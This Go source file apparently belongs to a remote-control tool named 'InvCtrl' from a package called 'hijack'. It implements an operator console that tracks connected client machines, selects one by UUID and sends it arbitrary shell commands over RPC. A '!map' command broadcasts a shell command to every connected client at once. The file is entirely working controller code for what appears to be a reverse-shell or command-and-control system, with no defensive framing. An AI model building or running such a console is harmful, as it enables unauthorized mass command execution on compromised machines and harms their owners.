package server

import (
	"fmt"
	"io"
	"log"
	"os"
	"strconv"
	"strings"

	//"github.com/davecgh/go-spew/spew"

	"github.com/invctrl/hijack/protocol"
	"gopkg.in/readline.v1"
)

func Input() {
	for {
		rl, err := readline.NewEx(&readline.Config{
			HistoryFile:         "/tmp/readline.tmp",
			ForceUseInteractive: true,
			// InterruptPrompt:     "exit?",
		})
		if err != nil {
			panic(err)
		}
		defer rl.Close()
		fmt.Println("Welcome to InvCtrl!!!")
		promptNum := 1
	INNER:
		for {
			rl.SetPrompt(fmt.Sprintf("In[%d]:= ", promptNum))
			line, err := rl.Readline()
			switch err {
			case nil: // NOP
			case io.EOF:
				fmt.Println("bye")
				break INNER
			case readline.ErrInterrupt:
				fmt.Println("try Exit, or Quit")
			default:
				fmt.Println(err)
			}

			echo := func(line string, client *Client) {
				req := protocol.EchoRequest{
					Payload: line,
				}
				resp := new(protocol.EchoResponse)
				err := client.RPC.Call("Echo.New", req, resp)
				if err != nil {
					log.Println(resp.Payload, err)
					return
				}
				log.Println("rpc echo response received:\n\n", resp.Payload)
			}

			bash := func(line string, client *Client) {
				req := protocol.Request{
					Command: line,
				}
				resp := new(protocol.Response)
				err := client.RPC.Call("Bash.Execute", req, resp)
				if err != nil {
					log.Println(resp.Message, err)
					return
				}
				log.Println("rpc message received:\n\n", resp.Message)
			}
			switch {
			case strings.HasPrefix(line, "Echo"):
				line = strings.TrimPrefix(line, "Echo")
				num, err := strconv.Atoi(line)
				if err != nil {
					log.Println(err)
					continue
				}
				for i := 0; i < num; i++ {
					/*
						v := ClientPool.Clients.Values()[0]
						client := v.(*Client)
					*/
					client := ClientPool.GetRandom()
					go echo(strconv.Itoa(i), client)
				}
				/*
					for _, v := range ClientPool.Clients.Values() {
						client := v.(*Client)
						go echo(line, client)
					}
				*/
				continue
			case strings.HasPrefix(line, "!map "):
				line = strings.TrimPrefix(line, "!map ")
				for _, v := range ClientPool.Clients.Values() {
					client := v.(*Client)
					go bash(line, client)
				}
				continue
			case line == "":
				continue
			case line == "Exit", line == "Quit":
				os.Exit(0)
			case line == "Ls":
				ClientPool.Dump()
				continue
			case ClientPool.Has(line):
				ClientPool.Current = ClientPool.Get(line)
				log.Println("current client:", ClientPool.Current.UUID)
				continue
			default:
				if ClientPool.Current == nil {
					fmt.Println("[INFO] Your current client is empty. Enter the uuid to the client you want to talk to first:")
					continue
				}
			}

			if line == "N" {
				client := ClientPool.Current
				conn, err := client.Pool.Get()
				log.Println("[POOL Size]", client.Pool.Len())
				if err == nil {
					go io.Copy(os.Stderr, conn)
				} else {
					log.Println(err)
				}
			} else {
				go bash(line, ClientPool.Current)
			}

			promptNum += 1
		}

		log.Println("stdin input closed")
	}
}
